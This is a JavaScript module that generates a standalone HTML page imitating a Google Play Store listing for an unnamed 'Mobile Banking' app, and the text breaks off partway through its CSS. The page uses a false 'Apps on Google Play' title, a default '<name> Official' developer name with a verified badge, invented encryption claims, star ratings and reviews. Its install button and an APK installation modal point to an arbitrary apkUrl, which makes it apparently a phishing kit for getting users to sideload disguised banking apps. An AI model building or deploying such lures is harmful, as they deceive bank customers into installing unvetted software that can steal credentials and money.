function escapeHtml(value = '') {
	return String(value).replace(/[&<>'"]/g, (char) => ({
		'&': '&amp;',
		'<': '&lt;',
		'>': '&gt;',
		'"': '&quot;',
		"'": '&#39;'
	})[char]);
}

export function buildStandaloneHtml(app = {}) {
	const name = escapeHtml(app.name || 'Mobile Banking');
	const logoUrl = escapeHtml(app.logoUrl || '');
	const apkUrl = escapeHtml(app.apkUrl || '#');
	const developer = escapeHtml(app.developer || (app.name ? `${app.name} Official` : 'Banking Official'));
	const tagline = escapeHtml(app.tagline || 'Secure Mobile Banking, Instant UPI Transfers & Financial Services');
	const description = escapeHtml(app.description || (`Official ${app.name || 'Mobile Banking'} app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security. Built with 256-bit bank-grade encryption.`));
	const version = escapeHtml(app.version || '2.4.1');

	return `<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#ffffff" />
    <title>${name}: Mobile Banking & Financial Services - Apps on Google Play</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500;700&family=DM+Sans:wght@400;500;600;700&family=Manrope:wght@700;800&display=swap" rel="stylesheet" />
    <style>
/* ==========================================================================
   Google Play Store Modern Design System - Banking & Financial Edition
   ========================================================================== */

:root {
    font-family: 'Google Sans', 'Roboto', 'DM Sans', -apple-system, BlinkMacSystemFont, sans-serif;
    color: #202124;
    background: #f8f9fa;
    font-synthesis: none;

    --ink: #202124;
    --muted: #5f6368;
    --muted-light: #80868b;
    --line: #e0e0e0;
    --line-subtle: #f1f3f4;
    
    /* Play Store & Banking Signature Colors */
    --google-green: #01875f;
    --google-green-hover: #017250;
    --google-green-light: #e6f4ea;
    --google-blue: #0b57d0;
    --google-blue-hover: #0842a0;
    --google-blue-light: #e8f0fe;
    --google-star: #e37400;
    --google-yellow: #fba904;

    --surface: #ffffff;
    --surface-elevated: #ffffff;
    --radius-sm: 8px;
    --radius-md: 12px;
    --radius-lg: 16px;
    --radius-xl: 24px;
    --radius-pill: 24px;

    --shadow-sm: 0 1px 2px 0 rgba(60, 64, 67, 0.1), 0 1px 3px 1px rgba(60, 64, 67, 0.05);
    --shadow-md: 0 4px 12px 0 rgba(60, 64, 67, 0.12), 0 1px 4px 0 rgba(60, 64, 67, 0.08);
    --shadow-lg: 0 8px 24px 0 rgba(60, 64, 67, 0.15), 0 2px 8px 0 rgba(60, 64, 67, 0.1);
}

* {
    box-sizing: border-box;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}

html {
    scroll-behavior: smooth;
    width: 100%;
    max-width: 100vw;
    overflow-x: hidden;
}

body {
    margin: 0;
    padding: 0;
    background-color: var(--surface);
    color: var(--ink);
    line-height: 1.5;
    width: 100%;
    max-width: 100vw;
    overflow-x: hidden;
}

/* ==========================================================================
   Top Header Navigation Bar
   ========================================================================== */

.topbar {
    height: 64px;
    background: #ffffff;
    border-bottom: 1px solid var(--line-subtle);
    box-shadow: 0 1px 2px rgba(60, 64, 67, 0.06);
    position: sticky;
    top: 0;
    z-index: 100;
    transition: background-color 0.2s ease, box-shadow 0.2s ease;
}

.topbar-inner {
    height: 100%;
    max-width: 1280px;
    margin: auto;
    padding: 0 32px;
    display: flex;
    align-items: center;
    gap: 40px;
}

.brand {
    font-family: 'Product Sans', 'Google Sans', sans-serif;
    font-size: 22px;
    font-weight: 500;
    text-decoration: none;
    color: #5f6368;
    letter-spacing: -0.3px;
    display: flex;
    align-items: center;
    gap: 12px;
    user-select: none;
}

.brand span:last-child {
    font-family: 'Google Sans', sans-serif;
    font-weight: 500;
    color: #5f6368;
    letter-spacing: -0.5px;
    text-transform: lowercase;
}

.brand-mark {
    width: 36px;
    height: 36px;
    border-radius: 10px;
    background: transparent;
    display: grid;
    place-items: center;
    transition: transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}

.brand:hover .brand-mark {
    transform: scale(1.08) rotate(3deg);
}

/* Search Box Container */

.search-box {
    height: 46px;
    max-width: 580px;
    flex: 1;
    background: #f1f3f4;
    border: 1px solid transparent;
    border-radius: 24px;
    display: flex;
    align-items: center;
    padding: 0 16px;
    color: #5f6368;
    transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
    cursor: text;
}

.search-box:hover {
    background: #e8eaed;
}

.search-box:focus-within {
    border-color: var(--google-blue);
    background: #ffffff;
    box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28);
}

.search-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    color: #5f6368;
    margin-right: 12px;
}

.search-box input {
    border: 0;
    outline: 0;
    background: transparent;
    font-family: 'Google Sans', 'Roboto', sans-serif;
    font-size: 15px;
    width: 100%;
    color: var(--ink);
}

.search-box input::placeholder {
    color: #5f6368;
    font-weight: 400;
}

kbd {
    font-family: 'Google Sans', sans-serif;
    font-size: 11px;
    font-weight: 500;
    border: 1px solid #dadce0;
    border-radius: 6px;
    padding: 3px 7px;
    background: #ffffff;
    color: #5f6368;
    white-space: nowrap;
    box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
}

/* Top Right User Actions */

.top-actions {
    margin-left: auto;
    display: flex;
    gap: 12px;
    align-items: center;
}

.icon-button {
    border: 0;
    background: transparent;
    width: 40px;
    height: 40px;
    border-radius: 50%;
    font-weight: 500;
    font-size: 16px;
    color: #5f6368;
    display: grid;
    place-items: center;
    cursor: pointer;
    transition: background-color 0.2s ease;
}

.icon-button:hover {
    background-color: #f1f3f4;
    color: var(--ink);
}

.avatar {
    border: 0;
    width: 36px;
    height: 36px;
    border-radius: 50%;
    background: #0b57d0;
    color: #ffffff;
    font-family: 'Google Sans', sans-serif;
    font-weight: 500;
    font-size: 13px;
    letter-spacing: 0.5px;
    cursor: pointer;
    box-shadow: var(--shadow-sm);
    transition: transform 0.2s ease, box-shadow 0.2s ease;
}

.avatar:hover {
    transform: scale(1.05);
    box-shadow: var(--shadow-md);
}

/* ==========================================================================
   Page Shell & Breadcrumbs
   ========================================================================== */

.page-shell {
    max-width: 1180px;
    margin: auto;
    padding: 28px 32px 120px;
}

.breadcrumbs {
    display: flex;
    align-items: center;
    gap: 8px;
    color: #80868b;
    font-size: 13px;
    font-family: 'Roboto', sans-serif;
    margin-bottom: 24px;
}

.breadcrumbs a {
    color: #5f6368;
    text-decoration: none;
    transition: color 0.15s ease;
}

.breadcrumbs a:hover {
    color: var(--google-blue);
    text-decoration: underline;
}

.breadcrumbs span {
    color: #bdc1c6;
}

/* ==========================================================================
   App Hero Section
   ========================================================================== */

.app-hero {
    display: grid;
    grid-template-columns: 128px 1fr auto;
    gap: 32px;
    align-items: start;
    padding-bottom: 36px;
    border-bottom: 1px solid var(--line-subtle);
}

.app-logo {
    width: 128px;
    height: 128px;
    border-radius: 28px;
    position: relative;
    display: grid;
    place-items: center;
    overflow: hidden;
    background: #f1f3f4;
    box-shadow: 0 4px 14px rgba(60, 64, 67, 0.15), 0 1px 3px rgba(60, 64, 67, 0.1);
    transition: transform 0.25s cubic-bezier(0.4, 0, 0.2, 1), box-shadow 0.25s ease;
}

.app-logo:hover {
    transform: translateY(-3px);
    box-shadow: 0 8px 24px rgba(60, 64, 67, 0.2), 0 2px 6px rgba(60, 64, 67, 0.12);
}

.app-copy {
    padding-top: 0px;
}

.eyebrow {
    color: var(--google-blue);
    font-weight: 700;
    letter-spacing: 1px;
    font-size: 11px;
    text-transform: uppercase;
    margin: 0 0 6px;
}

.app-copy h1 {
    font-family: 'Google Sans', sans-serif;
    font-weight: 700;
    font-size: 40px;
    line-height: 1.15;
    margin: 0;
    color: #202124;
    letter-spacing: -0.8px;
}

.developer {
    font-family: 'Google Sans', 'Roboto', sans-serif;
    font-size: 15px;
    font-weight: 500;
    margin: 8px 0 4px;
    color: var(--google-green);
    display: inline-flex;
    align-items: center;
    gap: 6px;
    cursor: pointer;
    transition: color 0.15s ease;
}

.developer:hover {
    color: var(--google-green-hover);
    text-decoration: underline;
}

.verified {
    display: inline-grid;
    place-items: center;
    width: 16px;
    height: 16px;
    border-radius: 50%;
    font-size: 10px;
    background: var(--google-green);
    color: #ffffff;
    font-weight: 700;
}

.tagline {
    font-size: 14px;
    color: #5f6368;
    margin: 4px 0 0;
    font-weight: 400;
}

/* Hero Meta Stat Badges */

.hero-meta {
    display: flex;
    align-items: center;
    gap: 24px;
    margin-top: 24px;
    color: var(--ink);
}

.hero-meta > span:not(.meta-divider) {
    display: flex;
    flex-direction: column;
    gap: 2px;
}

.hero-meta strong {
    font-family: 'Google Sans', sans-serif;
    font-size: 15px;
    font-weight: 700;
    color: #202124;
    display: flex;
    align-items: center;
    gap: 4px;
}

.hero-meta small {
    color: #5f6368;
    font-size: 12px;
    font-weight: 400;
}

.stars {
    font-size: 13px;
    color: var(--google-star);
    letter-spacing: 1px;
}

.meta-divider {
    height: 28px;
    width: 1px;
    background: #dadce0;
}

/* Hero Action Section */

.hero-action {
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    gap: 12px;
    min-width: 180px;
}

.install-button {
    width: 170px;
    height: 44px;
    border: 0;
    border-radius: 22px;
    background: var(--google-green);
    color: #ffffff;
    font-family: 'Google Sans', sans-serif;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
    transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    user-select: none;
    position: relative;
    overflow: hidden;
}

.install-button:hover {
    background: var(--google-green-hover);
    box-shadow: 0 3px 8px rgba(1, 135, 95, 0.35);
    transform: translateY(-1px);
}

.install-button:active {
    transform: translateY(0);
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
}

.install-button.installing {
    background: #0b57d0;
    cursor: wait;
}

.install-button.installed {
    background: #1a73e8;
}

.button-spinner {
    display: none;
    width: 18px;
    height: 18px;
    border: 2.5px solid rgba(255, 255, 255, 0.3);
    border-top-color: #ffffff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
}

.installing .button-spinner {
    display: inline-block;
}

.hero-action-buttons {
    display: flex;
    gap: 8px;
    width: 100%;
}

.action-chip {
    flex: 1;
    height: 36px;
    border: 1px solid #dadce0;
    background: #ffffff;
    border-radius: 18px;
    font-family: 'Google Sans', sans-serif;
    font-size: 12px;
    font-weight: 500;
    color: #0b57d0;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    transition: all 0.15s ease;
}

.action-chip:hover {
    background: #f1f8ff;
    border-color: #c2e7ff;
}

.availability {
    font-size: 12px;
    color: #5f6368;
    margin: 4px 0 0;
    display: flex;
    align-items: center;
    gap: 6px;
}

.availability::before {
    content: '💻';
    font-size: 13px;
}

/* Notice / Wishlist Toast Notification */

.notice {
    display: none;
    background: var(--google-green-light);
    color: #137333;
    border: 1px solid #ceead6;
    border-radius: 12px;
    padding: 14px 20px;
    font-size: 14px;
    font-weight: 500;
    margin: 24px 0 0;
    align-items: center;
    gap: 12px;
    box-shadow: var(--shadow-sm);
    animation: slideDown 0.3s cubic-bezier(0, 0, 0.2, 1);
}

.notice.show {
    display: flex;
}

.notice-icon {
    width: 24px;
    height: 24px;
    border-radius: 50%;
    background: #137333;
    color: #ffffff;
    display: grid;
    place-items: center;
    font-size: 13px;
    font-weight: 700;
    flex-shrink: 0;
}

.notice button {
    margin-left: auto;
    border: 0;
    background: transparent;
    color: #137333;
    font-size: 22px;
    cursor: pointer;
    line-height: 1;
    border-radius: 50%;
    width: 28px;
    height: 28px;
    display: grid;
    place-items: center;
}

.notice button:hover {
    background: rgba(19, 115, 51, 0.1);
}

/* ==========================================================================
   Content Grid Layout
   ========================================================================== */

.content-grid {
    display: grid;
    grid-template-columns: minmax(0, 1fr) 300px;
    gap: 60px;
    margin-top: 36px;
}

.main-column {
    min-width: 0;
}

.section-block {
    padding: 28px 0;
    border-top: 1px solid var(--line-subtle);
}

.section-block:first-child {
    border-top: 0;
    padding-top: 0;
}

.section-heading {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;
}

.section-heading h2,
.info-heading h2 {
    font-family: 'Google Sans', sans-serif;
    font-size: 22px;
    font-weight: 500;
    color: #202124;
    margin: 0;
    letter-spacing: -0.3px;
}

.round-arrow {
    border: 1px solid #dadce0;
    background: #ffffff;
    color: #5f6368;
    width: 36px;
    height: 36px;
    border-radius: 50%;
    font-size: 18px;
    display: grid;
    place-items: center;
    cursor: pointer;
    transition: all 0.2s ease;
}

.round-arrow:hover {
    background: #f1f3f4;
    color: var(--ink);
    border-color: #bdc1c6;
}

/* ==========================================================================
   Banking Screenshots & Pure CSS Interactive Previews
   ========================================================================== */

.screenshots {
    display: flex;
    gap: 16px;
    overflow-x: auto;
    scroll-snap-type: x mandatory;
    scrollbar-width: none;
    padding-bottom: 8px;
}

.screenshots::-webkit-scrollbar {
    display: none;
}

.shot {
    flex: 0 0 220px;
    height: 380px;
    border-radius: 20px;
    overflow: hidden;
    padding: 24px 20px;
    position: relative;
    scroll-snap-align: start;
    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
    transition: transform 0.25s ease, box-shadow 0.25s ease;
    border: 1px solid rgba(0, 0, 0, 0.05);
    user-select: none;
}

.shot:hover {
    transform: translateY(-4px);
    box-shadow: 0 12px 30px rgba(0, 0, 0, 0.14);
}

/* Shot 1: Deep Navy Blue Bank Theme */
.shot-one {
    background: linear-gradient(145deg, #0a2540 0%, #0052cc 100%);
    color: #ffffff;
}

/* Shot 2: Premium Indigo & Gold Credit Theme */
.shot-two {
    background: linear-gradient(145deg, #1e1b4b 0%, #312e81 100%);
    color: #ffffff;
}

/* Shot 3: Emerald & Teal Security Theme */
.shot-three {
    background: linear-gradient(145deg, #064e3b 0%, #047857 100%);
    color: #ffffff;
}

.shot-top {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 0.5px;
    opacity: 0.9;
}

.shot-title {
    font-family: 'Google Sans', sans-serif;
    font-size: 20px;
    font-weight: 700;
    margin-top: 14px;
    margin-bottom: 12px;
    line-height: 1.25;
    letter-spacing: -0.5px;
}

/* Banking Balance Card */
.bank-balance-card {
    background: rgba(255, 255, 255, 0.12);
    backdrop-filter: blur(12px);
    border: 1px solid rgba(255, 255, 255, 0.2);
    border-radius: 14px;
    padding: 12px;
    margin-bottom: 12px;
}

.bank-balance-card small {
    font-size: 10px;
    opacity: 0.8;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.balance-num {
    font-family: 'Google Sans', sans-serif;
    font-size: 22px;
    font-weight: 700;
    color: #00f5d4;
    margin: 4px 0;
}

.acc-num {
    font-size: 10px;
    opacity: 0.85;
}

/* Quick Bank Action Buttons */
.quick-bank-actions {
    display: flex;
    gap: 6px;
    margin-bottom: 10px;
}

.bank-act-btn {
    flex: 1;
    background: rgba(255, 255, 255, 0.2);
    border-radius: 8px;
    padding: 6px 4px;
    font-size: 10px;
    font-weight: 600;
    text-align: center;
    backdrop-filter: blur(6px);
}

.task-card {
    background: rgba(255, 255, 255, 0.9);
    backdrop-filter: blur(8px);
    border-radius: 12px;
    padding: 8px 10px;
    margin-top: 8px;
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 10px;
    font-weight: 600;
    color: #0f172a;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.08);
}

.task-card em {
    margin-left: auto;
    font-style: normal;
    font-size: 10px;
    color: #059669;
    font-weight: 700;
}

.check {
    width: 16px;
    height: 16px;
    border: 1.5px solid #10b981;
    border-radius: 5px;
    display: grid;
    place-items: center;
    flex-shrink: 0;
}

.check.checked {
    background: #10b981;
    border-color: #10b981;
    color: #ffffff;
    font-size: 10px;
    font-weight: 700;
}

.progress-line {
    height: 6px;
    background: rgba(255, 255, 255, 0.2);
    border-radius: 4px;
    margin-top: 18px;
    overflow: hidden;
}

.progress-line span {
    display: block;
    height: 100%;
    background: #00f5d4;
    border-radius: 4px;
}

/* Banking Credit Limit Card */
.bank-credit-box {
    background: rgba(255, 255, 255, 0.12);
    border: 1px solid rgba(255, 255, 255, 0.2);
    border-radius: 14px;
    padding: 12px;
    margin-top: 12px;
}

.bank-credit-box small {
    font-size: 10px;
    opacity: 0.8;
    text-transform: uppercase;
}

.bank-credit-box strong {
    font-family: 'Google Sans', sans-serif;
    font-size: 24px;
    display: block;
    color: #fbbf24;
    margin-top: 2px;
}

.ring {
    height: 120px;
    width: 120px;
    border: 10px solid rgba(255, 255, 255, 0.3);
    border-left-color: #fbbf24;
    border-bottom-color: #fbbf24;
    border-top-color: #fbbf24;
    border-radius: 50%;
    margin: 20px auto 14px;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    background: rgba(255, 255, 255, 0.1);
    box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.1);
}

.ring b {
    font-family: 'Google Sans', sans-serif;
    font-size: 22px;
    font-weight: 700;
    color: #ffffff;
    line-height: 1;
}

.ring small {
    font-size: 10px;
    color: #cbd5e1;
    font-weight: 600;
    margin-top: 4px;
    text-transform: uppercase;
}

.mini-bars {
    display: flex;
    align-items: flex-end;
    justify-content: center;
    gap: 6px;
    height: 24px;
    margin: 14px 0 10px;
}

.mini-bars i {
    display: block;
    width: 14px;
    background: rgba(255, 255, 255, 0.3);
    border-radius: 4px;
    height: 12px;
}

.mini-bars i:nth-child(2) { height: 20px; }
.mini-bars i:nth-child(3) { height: 16px; }
.mini-bars i:nth-child(4) { height: 24px; background: #fbbf24; }
.mini-bars i:nth-child(5) { height: 18px; }

.shot-two > strong {
    font-size: 12px;
    text-align: center;
    display: block;
    color: #e2e8f0;
    font-weight: 600;
}

.note-label {
    font-size: 10px;
    font-weight: 700;
    letter-spacing: 1px;
}

.shot-three strong {
    font-family: 'Google Sans', sans-serif;
    font-size: 20px;
    font-weight: 700;
    line-height: 1.25;
    display: block;
    margin-top: 18px;
}

.shot-three p {
    font-size: 12px;
    line-height: 1.5;
    opacity: 0.9;
    margin-top: 8px;
}

.note-dot {
    width: 44px;
    height: 44px;
    border-radius: 50%;
    background: #10b981;
    color: #ffffff;
    display: grid;
    place-items: center;
    font-size: 20px;
    font-weight: 700;
    position: absolute;
    right: 20px;
    bottom: 24px;
    box-shadow: 0 4px 12px rgba(16, 185, 129, 0.4);
}

/* ==========================================================================
   About & Description Section
   ========================================================================== */

.about p,
.update-copy {
    font-size: 15px;
    color: #5f6368;
    line-height: 1.65;
    margin: 0;
    max-width: 680px;
}

.tag-chips {
    display: flex;
    flex-wrap: wrap;
    gap: 8px;
    margin-top: 16px;
}

.tag {
    background: #f1f3f4;
    color: #3c4043;
    font-size: 12px;
    font-weight: 500;
    padding: 6px 12px;
    border-radius: 16px;
}

.learn-more {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    color: var(--google-blue);
    font-family: 'Google Sans', sans-serif;
    font-weight: 500;
    font-size: 14px;
    text-decoration: none;
    margin-top: 20px;
    transition: color 0.15s ease;
}

.learn-more:hover {
    color: var(--google-blue-hover);
    text-decoration: underline;
}

.learn-more span {
    font-size: 18px;
    line-height: 1;
}

/* ==========================================================================
   What's New Section
   ========================================================================== */

.version {
    font-size: 13px;
    color: #5f6368;
    font-weight: 500;
}

.update-pills {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    margin-top: 18px;
}

.update-pills span {
    background: #f1f3f4;
    border-radius: 8px;
    padding: 8px 14px;
    font-size: 13px;
    color: #3c4043;
    font-weight: 500;
}

/* ==========================================================================
   Ratings and Reviews Section
   ========================================================================== */

.ratings-container {
    display: flex;
    gap: 40px;
    align-items: center;
    background: #f8f9fa;
    padding: 24px;
    border-radius: 16px;
    margin-top: 16px;
}

.score-card {
    display: flex;
    flex-direction: column;
    align-items: center;
}

.score-num {
    font-family: 'Google Sans', sans-serif;
    font-size: 56px;
    font-weight: 700;
    color: #202124;
    line-height: 1;
}

.score-stars {
    color: var(--google-star);
    font-size: 18px;
    letter-spacing: 2px;
    margin: 6px 0;
}

.score-count {
    color: #5f6368;
    font-size: 12px;
}

.rating-bars-list {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 6px;
}

.rating-bar-item {
    display: flex;
    align-items: center;
    gap: 12px;
    font-size: 12px;
    color: #5f6368;
    font-weight: 500;
}

.bar-track {
    flex: 1;
    height: 10px;
    background: #e8eaed;
    border-radius: 5px;
    overflow: hidden;
}

.bar-fill {
    height: 100%;
    background: var(--google-green);
    border-radius: 5px;
}

/* User Review Cards */

.reviews-list {
    margin-top: 24px;
}

.review-item {
    border-top: 1px solid var(--line-subtle);
    padding: 20px 0 0;
}

.review-user {
    display: flex;
    align-items: center;
    gap: 12px;
}

.user-avatar-circle {
    width: 36px;
    height: 36px;
    border-radius: 50%;
    display: grid;
    place-items: center;
    font-weight: 700;
    font-size: 13px;
}

.user-details strong {
    font-size: 14px;
    display: block;
    color: #202124;
}

.user-rating-line {
    font-size: 12px;
    color: #5f6368;
}

.stars-sm {
    color: var(--google-star);
}

.review-text {
    font-size: 14px;
    color: #3c4043;
    line-height: 1.6;
    margin: 10px 0 6px;
}

.review-helpful small {
    color: #80868b;
    font-size: 12px;
}

/* ==========================================================================
   Sidebar Column & Info Cards
   ========================================================================== */

.side-column {
    padding-top: 0;
}

.info-card {
    border: 1px solid var(--line-subtle);
    background: #ffffff;
    border-radius: 16px;
    padding: 24px 20px;
    margin-bottom: 20px;
    box-shadow: 0 1px 3px rgba(60, 64, 67, 0.08);
}

.info-heading {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 18px;
}

.more {
    color: #80868b;
    letter-spacing: 2px;
    font-size: 14px;
    cursor: pointer;
}

.info-row {
    display: flex;
    gap: 14px;
    padding: 14px 0;
    border-top: 1px solid #f1f3f4;
    align-items: center;
}

.info-row:first-of-type {
    border-top: 0;
    padding-top: 0;
}

.info-icon {
    width: 36px;
    height: 36px;
    border-radius: 10px;
    background: var(--google-blue-light);
    color: var(--google-blue);
    display: grid;
    place-items: center;
    font-size: 18px;
    flex-shrink: 0;
}

.info-row:nth-child(3) .info-icon {
    background: #fff0e6;
    color: #e37400;
}

.info-row:nth-child(4) .info-icon {
    background: var(--google-green-light);
    color: var(--google-green);
}

.info-row:nth-child(5) .info-icon {
    background: #f3e8fd;
    color: #8e24aa;
}

.info-row span:last-child {
    display: flex;
    flex-direction: column;
    gap: 2px;
}

.info-row b {
    font-size: 13px;
    color: #202124;
    font-weight: 500;
}

.info-row small,
.safety-card p {
    font-size: 12px;
    color: #5f6368;
    line-height: 1.5;
}

.safety-card p {
    margin: 0 0 16px;
}

.shield {
    width: 28px;
    height: 28px;
    border-radius: 8px;
    background: var(--google-green-light);
    color: var(--google-green);
    display: grid;
    place-items: center;
    font-size: 14px;
    font-weight: 700;
}

.safety-points {
    display: flex;
    flex-direction: column;
    gap: 12px;
    margin-bottom: 16px;
}

.safety-point {
    display: flex;
    align-items: center;
    gap: 10px;
    font-size: 12px;
    color: #3c4043;
}

.point-icon {
    font-size: 14px;
}

/* ==========================================================================
   Bottom Mobile Navigation
   ========================================================================== */

.bottom-nav {
    display: none;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

@keyframes slideDown {
    from { opacity: 0; transform: translateY(-10px); }
    to { opacity: 1; transform: translateY(0); }
}

/* ==========================================================================
   Responsive Breakpoints & Mobile Optimization
   ========================================================================== */

/* Tablet Breakpoint (max-width: 1024px) */
@media (max-width: 1024px) {
    .page-shell {
        padding: 24px 24px 110px;
        max-width: 100%;
    }

    .content-grid {
        grid-template-columns: minmax(0, 1fr) 260px;
        gap: 36px;
    }
    
    .search-box {
        max-width: 400px;
    }
}

/* Mobile & Small Tablet Breakpoint (max-width: 800px) */
@media (max-width: 800px) {
    .topbar {
        height: 56px;
    }

    .topbar-inner {
        padding: 0 16px;
        gap: 12px;
        max-width: 100%;
    }

    .brand span:last-child,
    .top-actions .icon-button,
    kbd {
        display: none;
    }

    .search-box {
        height: 40px;
        padding: 0 12px;
    }

    .search-box input {
        font-size: 13px;
    }

    .page-shell {
        padding: 16px 16px 90px;
        width: 100%;
        max-width: 100%;
        overflow-x: hidden;
    }

    .breadcrumbs {
        margin-bottom: 16px;
        font-size: 12px;
        flex-wrap: wrap;
    }

    .app-hero {
        grid-template-columns: 80px 1fr;
        gap: 16px;
        align-items: start;
        padding-bottom: 20px;
        width: 100%;
    }

    .app-logo {
        width: 80px;
        height: 80px;
        border-radius: 20px;
        flex-shrink: 0;
    }

    .app-copy {
        width: 100%;
        min-width: 0;
    }

    .app-copy h1 {
        font-size: 26px;
        line-height: 1.2;
        word-break: break-word;
    }

    .developer {
        font-size: 13px;
    }

    .tagline {
        font-size: 13px;
        line-height: 1.4;
    }

    .hero-meta {
        gap: 12px;
        margin-top: 14px;
        overflow-x: auto;
        padding-bottom: 4px;
        width: 100%;
        -webkit-overflow-scrolling: touch;
        scrollbar-width: none;
    }

    .hero-meta::-webkit-scrollbar {
        display: none;
    }

    .hero-meta small {
        font-size: 11px;
        white-space: nowrap;
    }

    .hero-meta strong {
        font-size: 13px;
        white-space: nowrap;
    }

    .hero-action {
        grid-column: 1 / -1;
        width: 100%;
        margin-top: 10px;
    }

    .install-button {
        width: 100%;
        height: 44px;
        font-size: 14px;
    }

    .hero-action-buttons {
        width: 100%;
    }

    .action-chip {
        height: 38px;
        font-size: 12px;
    }

    .content-grid {
        display: flex;
        flex-direction: column;
        gap: 24px;
        margin-top: 20px;
        width: 100%;
    }

    .main-column,
    .side-column {
        width: 100%;
        min-width: 0;
    }

    .side-column {
        margin-top: 16px;
    }

    .section-block {
        padding: 20px 0;
    }

    .section-heading h2,
    .info-heading h2 {
        font-size: 18px;
    }

    .screenshots {
        width: 100%;
        display: flex;
        gap: 12px;
        overflow-x: auto;
        scroll-snap-type: x mandatory;
        padding-bottom: 8px;
        -webkit-overflow-scrolling: touch;
    }

    .shot {
        flex: 0 0 170px;
        width: 170px;
        height: 320px;
        padding: 16px 14px;
        border-radius: 16px;
    }

    .shot-title {
        font-size: 18px;
        margin-top: 12px;
        margin-bottom: 10px;
    }

    .task-card {
        padding: 8px 10px;
        font-size: 10px;
    }

    .ring {
        width: 100px;
        height: 100px;
        border-width: 8px;
        margin: 12px auto 10px;
    }

    .ring b {
        font-size: 20px;
    }

    .ratings-container {
        flex-direction: column;
        gap: 16px;
        padding: 16px;
        border-radius: 12px;
        width: 100%;
    }

    .score-card {
        flex-direction: row;
        gap: 12px;
        align-items: center;
    }

    .score-num {
        font-size: 42px;
    }

    .rating-bars-list {
        width: 100%;
    }

    .notice {
        flex-wrap: wrap;
        padding: 12px 14px;
        font-size: 13px;
        width: 100%;
    }

    /* Fixed Bottom Navigation Bar */
    .bottom-nav {
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        height: 60px;
        background: rgba(255, 255, 255, 0.98);
        border-top: 1px solid var(--line-subtle);
        display: flex;
        justify-content: space-around;
        align-items: center;
        z-index: 100;
        backdrop-filter: blur(16px);
        box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.05);
        padding-bottom: env(safe-area-inset-bottom);
    }

    .bottom-nav a {
        color: #5f6368;
        text-decoration: none;
        font-size: 11px;
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 2px;
        font-weight: 500;
    }

    .bottom-nav a span {
        font-size: 20px;
        line-height: 20px;
    }

    .bottom-nav a.active {
        color: var(--google-blue);
    }
}

/* Extra Small Phones Breakpoint (max-width: 480px) */
@media (max-width: 480px) {
    .topbar-inner {
        padding: 0 12px;
    }

    .brand {
        font-size: 18px;
    }

    .search-box {
        height: 38px;
        padding: 0 10px;
    }

    .search-icon svg {
        width: 15px;
        height: 15px;
    }

    .app-hero {
        grid-template-columns: 72px 1fr;
        gap: 12px;
    }

    .app-logo {
        width: 72px;
        height: 72px;
        border-radius: 16px;
    }

    .app-copy h1 {
        font-size: 22px;
    }

    .developer {
        font-size: 12px;
    }

    .tagline {
        font-size: 12px;
    }

    .action-chip {
        font-size: 11px;
        height: 36px;
    }

    .shot {
        flex: 0 0 155px;
        width: 155px;
        height: 290px;
        padding: 12px 10px;
    }

    .about p,
    .update-copy,
    .review-text {
        font-size: 13px;
        line-height: 1.55;
    }
}

/* ==========================================================================
   APK Installation Modal Overlay
   ========================================================================== */
.install-modal-overlay {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0, 0, 0, 0.65);
    backdrop-filter: blur(6px);
    z-index: 1000;
    display: none;
    align-items: center;
    justify-content: center;
    padding: 20px;
}

.install-modal-overlay.show {
    display: flex;
    animation: fadeIn 0.2s ease-out;
}

.install-modal-card {
    background: #ffffff;
    border-radius: 20px;
    max-width: 440px;
    width: 100%;
    padding: 24px;
    box-shadow: 0 12px 36px rgba(0, 0, 0, 0.28);
    font-family: 'Google Sans', 'Roboto', sans-serif;
}

.modal-header {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 16px;
}

.modal-icon {
    font-size: 28px;
}

.modal-header h3 {
    margin: 0;
    font-size: 20px;
    font-weight: 700;
    color: #202124;
    flex: 1;
}

.modal-close {
    border: 0;
    background: transparent;
    font-size: 24px;
    cursor: pointer;
    color: #5f6368;
    line-height: 1;
    width: 32px;
    height: 32px;
    border-radius: 50%;
    display: grid;
    place-items: center;
}

.modal-close:hover {
    background: #f1f3f4;
}

.modal-body p {
    margin: 0 0 12px;
